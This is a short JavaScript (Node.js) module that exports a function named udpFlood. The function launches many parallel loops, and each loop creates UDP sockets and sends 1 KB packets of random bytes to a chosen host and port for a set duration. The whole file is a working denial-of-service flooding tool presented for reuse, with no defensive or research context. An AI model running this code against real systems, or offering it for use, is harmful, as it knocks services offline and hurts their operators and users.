const dgram = require('dgram');
const crypto = require('crypto');

async function udpFlood(target, duration, intensity = 100) {
  const url = new URL(target);
  const hostname = url.hostname;
  const port = url.port || 80;
  const startTime = Date.now();

  console.log(`UDP flood started against ${target} with intensity ${intensity}`);

  for (let i = 0; i < intensity; i++) {
    flood(hostname, port, duration, startTime);
  }

  await new Promise(resolve => setTimeout(resolve, duration * 1000));
  console.log(`UDP flood finished against ${target}`);
}

async function flood(hostname, port, duration, startTime) {
  while (Date.now() - startTime < duration * 1000) {
    try {
      const socket = dgram.createSocket('udp4');
      const message = crypto.randomBytes(1024);

      socket.send(message, port, hostname, (err) => {
        if (err) {
          console.error(`UDP send error: ${err}`);
        }
      });

      socket.on('error', (err) => {
        console.error(`Socket error: ${err}`);
      });

      socket.on('close', () => {
      });
    } catch (error) {
      console.error(`Error creating or sending UDP packet: ${error}`);
    }
  }
}

module.exports = { udpFlood };